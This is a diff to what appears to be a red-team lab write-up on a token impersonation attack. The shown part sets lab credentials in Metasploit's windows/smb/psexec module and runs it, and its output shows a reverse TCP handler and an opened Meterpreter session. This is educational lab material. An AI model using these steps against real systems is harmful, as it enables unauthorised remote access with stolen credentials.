@@ -287,12 +287,9 @@ These values tell Metasploit:
 * which credentials to use
 * how to authenticate to the target system
 
+**Output:**
 
-
-
-
-
-
+```text
 msf exploit(windows/smb/psexec) > set RHOSTS 192.168.5.142
 RHOSTS => 192.168.5.142
 msf exploit(windows/smb/psexec) > set Interrupt: use the 'exit' command to quit
@@ -304,10 +301,39 @@ msf exploit(windows/smb/psexec) > set SMBPass Password1
 SMBPass => Password1
 msf exploit(windows/smb/psexec) > set SMBDomain readteambd.local
 SMBDomain => readteambd.local
+msf exploit(windows/smb/psexec) >
+```
+<p align="center">
+  <img src="/writeups/token impersonation attack/images/step1 1.5.png" width="600">
+</p>
+
+### Step 1 1.6: Get Meterpreter Session
+
+Now just run the following command & get meterpreter session
+
+```bash
+run
+```
+
+**Output:**
+
+```text
 msf exploit(windows/smb/psexec) > run
+[*] Started reverse TCP handler on 192.168.5.128:4444 
+[*] 192.168.5.142:445 - Connecting to the server...
+[*] 192.168.5.142:445 - Authenticating to 192.168.5.142:445|readteambd.local as user 'rahimkhan'...
+[*] 192.168.5.142:445 - Selecting PowerShell target
+[*] 192.168.5.142:445 - Executing the payload...
+[+] 192.168.5.142:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (196678 bytes) to 192.168.5.142
+[*] Meterpreter session 1 opened (192.168.5.128:4444 -> 192.168.5.142:59364) at 2026-06-01 02:42:04 -0400
 
+meterpreter >
+```
 
-
+<p align="center">
+  <img src="/writeups/token impersonation attack/images/step1 1.6.png" width="600">
+</p>
 
 
 
